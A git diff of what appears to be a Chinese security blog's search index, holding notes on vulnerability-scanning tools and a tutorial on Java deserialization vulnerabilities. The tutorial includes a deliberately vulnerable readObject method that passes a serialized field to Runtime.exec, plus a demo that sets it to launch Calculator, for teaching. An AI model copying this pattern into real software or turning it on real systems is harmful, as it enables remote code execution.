+<p><a href="https://github.com/ac0d3r/xssfinder">https://github.com/ac0d3r/xssfinder</a></p>
+<p><a href="https://github.com/kleiton0x00/ppmap">https://github.com/kleiton0x00/ppmap</a></p>
+<h3 id="SQL-注入-TODO"><a href="#SQL-注入-TODO" class="headerlink" title="SQL 注入  TODO"></a>SQL 注入  TODO</h3><p>提取 <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> 中关于检测的代码，提取一部分思想就行了</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>通过指纹识别进行对应的漏洞检测</p>
+<p>todo 不内置 nuclei 的 yml 文件，改为官方在线下载、更新</p>
+<p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p>
+<p>xray poc  中有些写的不规范，导致解析有问题，需要修改<br>比如：<br>response.status &#x3D;&#x3D; 200 &amp;&amp; response.headers[“content-type”] &#x3D;&#x3D; “text&#x2F;css” &amp;&amp; response.body.bcontains(b”$_GET[‘css’]”)</p>
+<p>content-type 应为 Content-Type</p>
+<p>但又好像是解析有问题</p>
+<p>不使用 xray 的 poc，只使用 nuclei 的 yml 文件<br>一起使用还要整理，防止重复扫描，nuclei-template 的 poc 已经够了</p>
+<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><a href="https://github.com/wrenchonline/glint">https://github.com/wrenchonline/glint</a> 作者设计的我看不懂，自己重来</p>
+<p><a href="https://github.com/veo/vscan">https://github.com/veo/vscan</a>	</p>
+<h3 id="一些其他漏洞"><a href="#一些其他漏洞" class="headerlink" title="一些其他漏洞"></a>一些其他漏洞</h3><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p><a href="https://github.com/a1phaboy/FastjsonScan">https://github.com/a1phaboy/FastjsonScan</a></p>
 ]]></content>
       <categories>
-        <category>域渗透</category>
+        <category>开源工具</category>
       </categories>
       <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初探Java反序列化漏洞(一)</title>
-    <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
-    <content><![CDATA[<blockquote>
-<p>  学无止境，参考着资料边学边记录吧。</p>
-</blockquote>
-<h2 id="0x01-Java序列化与反序列化"><a href="#0x01-Java序列化与反序列化" class="headerlink" title="0x01 Java序列化与反序列化"></a>0x01 Java序列化与反序列化</h2><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程。这一过程将数据分解成字节流，以便存储在文件中或在网络上传输；</p>
-<p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。就是打开字节流并重构成对象，恢复数据。</p>
-<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过以下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写入对象内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取对象内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-为什么需要序列化与反序列化"><a href="#0x02-为什么需要序列化与反序列化" class="headerlink" title="0x02 为什么需要序列化与反序列化"></a>0x02 为什么需要序列化与反序列化</h2><p>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。而当两个Java进程进行通信时，可以通过Java的序列化与反序列化在进程之间直接传送对象，换句话说，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；接收方需要从字节序列中恢复出Java对象。</p>
-<p>使用场景：</p>
-<ul>
-<li><p>想把内存中的对象保存到一个文件中或者数据库中时候；</p>
-</li>
-<li><p>想用套接字在网络上传送对象的时候；</p>
-</li>
-<li><p>想通过RMI传输对象的时候</p>
-</li>
-</ul>
-<p>一些应用场景涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p>
-<p>总之，序列化的用途就是传递和存储。</p>
-<h2 id="0x03-序列化实现的方式"><a href="#0x03-序列化实现的方式" class="headerlink" title="0x03 序列化实现的方式"></a>0x03 序列化实现的方式</h2><h3 id="3-1-Serializable"><a href="#3-1-Serializable" class="headerlink" title="3.1 Serializable"></a>3.1 Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是String类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化(用<code>transient</code>关键字修饰的属性除外，不参与序列化过程) 。</p>
-<p><strong>需要序列化的类</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 21:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>序列化</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line">        serialize(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(User user)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fout);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到运行后，生产了一个文件，将<code>user</code> 对象变成了可持久化存储的二进制数据。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211458.png" alt="image-20210404222530833"></p>
-<p>可以来看一下该对象序列化后的二进制数据</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211505.png" alt="image-20210404223840477"></p>
-<p>序列化的数据流以魔术数字和版本号开头，这个值是在调用<code>ObjectOutputStream</code>序列化时，由<code>writeStreamHeader</code>方法写入。开头的几位一般来当作Java序列化字节的特征。</p>
-<p><strong>反序列化</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        <span class="comment">// 反序列化，将字节序列恢复为对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(user1.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211519.png" alt="image-20210404224748419"></p>
-<p>读取了序列化文件，将二进制文件重新恢复为<code>user</code>对象，对象里面的属性也是完美恢复。</p>
-<h3 id="3-2-Externalizable"><a href="#3-2-Externalizable" class="headerlink" title="3.2 Externalizable"></a>3.2 Externalizable</h3><p>通过实现<code>Externalizable</code>接口进行序列化和反序列胡，但必须实现<code>writeExternal</code>、<code>readExternal</code>方法，并且还要实现一个类的<strong>无参构造方法</strong>，<code>Serializable</code> 接口可以不用实现。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/5 00:24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现了Externalizable这个接口需要提供无参构造，在反序列化时会检测</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>用法和实现了<code>Serializable</code>接口一样，这里就不演示了。</p>
-<h2 id="0x04-readObject-方法"><a href="#0x04-readObject-方法" class="headerlink" title="0x04 readObject()方法"></a>0x04 readObject()方法</h2><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用。因为在序列化过程中，JVM虚拟机会试图调用对象类里的 <code>writeObject</code> 和 <code>readObject</code> 方法，进行用户自定义的序列化和反序列化，如果没有这样的方法，则默认调用是 <code>ObjectOutputStream</code> 的 <code>defaultWriteObject</code> 方法以及 <code>ObjectInputStream</code> 的 <code>defaultReadObject</code> 方法。用户自定义的 <code>writeObject</code> 和 <code>readObject</code> 方法可以允许用户控制序列化的过程，比如可以在序列化的过程中动态改变序列化的数值。 </p>
-<blockquote>
-<p>  Java反序列化的过程中可以自动执行序列化类的四个方法，实现了<code>Serializable</code>接口可以执行的方法包括<code>readObject</code>、<code>readObjectNoData</code>、<code>readResolve</code>，以及实现了<code>Externalizable</code>接口的<code>readExternal</code>方法。这些在找反序列化漏洞时都需要重点关注。</p>
-</blockquote>
-<p>如果<code>readObject</code>方法书写不当的话就有可能引发恶意代码的执行，例如</p>
-<p><strong>基本类</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass(String name)构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的getName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的setName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的toString()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EvilClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + getName() + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的readObject()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="comment">// windows</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, name&#125;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, name&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>readObject</code>中存在执行命令的代码<code>Runtime.getRuntime().exec(new String[]&#123;&quot;open&quot;, &quot;-a&quot;, name&#125;)</code>，name参数是要执行的命令。那么我们可以构造一个恶意的对象，将其name属性赋值为要执行的命令，当反序列化触发<code>readObject</code>时就会RCE。如下</p>
-<p><strong>序列化和反序列化</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line"><span class="comment">//        evilObj.setName(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        evilObj.setName(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = serializeToBytes(evilObj);</span><br><span class="line">	<span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">o</span> <span class="operator">=</span> (EvilClass)deserializeFromBytes(bytes);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serializeToBytes(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromBytes</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211527.png" alt="image-20210405000541157"></p>
-<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中，这样写的开发绝对会被拉出去祭天的。所以反序列化漏洞通常会需要Java的一些特性进行配合比如<code>反射(invoke)</code>。然后就是利用链的寻找。反序列化漏洞需要三个东西</p>
-<ol>
-<li>反序列化入口(source)</li>
-<li>目标方法(sink)</li>
-<li>利用链(gadget chain)</li>
-</ol>
-<p>大佬们基本都会去寻找重写了这个<code>readObject</code>方法的类，并配合Java的<code>invoke</code>反射机制，构造利用链，形成了Java中最具特色的反序列化攻击。而且再看上图中的输出结果，不仅仅触发了<code>readObject</code>方法，还触发了<code>toString()</code>、<code>无参构造</code>、<code>set</code>、<code>get</code>方法，那么在实际寻找利用链的过程中就不仅仅需要关注<code>readObject()</code>的方法了。</p>
-<p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Java反序列之从萌新到菜鸟 <a href="https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/">https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/</a> </p>
-<p>Java反序列化技术分享 <a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a> </p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
+        <tag>开源工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1815,6 +1740,132 @@
       </tags>
   </entry>
   <entry>
+    <title>初探Java反序列化漏洞(一)</title>
+    <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
+    <content><![CDATA[<blockquote>
+<p>  学无止境，参考着资料边学边记录吧。</p>
+</blockquote>
+<h2 id="0x01-Java序列化与反序列化"><a href="#0x01-Java序列化与反序列化" class="headerlink" title="0x01 Java序列化与反序列化"></a>0x01 Java序列化与反序列化</h2><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程。这一过程将数据分解成字节流，以便存储在文件中或在网络上传输；</p>
+<p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。就是打开字节流并重构成对象，恢复数据。</p>
+<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过以下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写入对象内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取对象内容</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-为什么需要序列化与反序列化"><a href="#0x02-为什么需要序列化与反序列化" class="headerlink" title="0x02 为什么需要序列化与反序列化"></a>0x02 为什么需要序列化与反序列化</h2><p>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。而当两个Java进程进行通信时，可以通过Java的序列化与反序列化在进程之间直接传送对象，换句话说，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；接收方需要从字节序列中恢复出Java对象。</p>
+<p>使用场景：</p>
+<ul>
+<li><p>想把内存中的对象保存到一个文件中或者数据库中时候；</p>
+</li>
+<li><p>想用套接字在网络上传送对象的时候；</p>
+</li>
+<li><p>想通过RMI传输对象的时候</p>
+</li>
+</ul>
+<p>一些应用场景涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p>
+<p>总之，序列化的用途就是传递和存储。</p>
+<h2 id="0x03-序列化实现的方式"><a href="#0x03-序列化实现的方式" class="headerlink" title="0x03 序列化实现的方式"></a>0x03 序列化实现的方式</h2><h3 id="3-1-Serializable"><a href="#3-1-Serializable" class="headerlink" title="3.1 Serializable"></a>3.1 Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是String类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化(用<code>transient</code>关键字修饰的属性除外，不参与序列化过程) 。</p>
+<p><strong>需要序列化的类</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 21:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>序列化</strong></p>
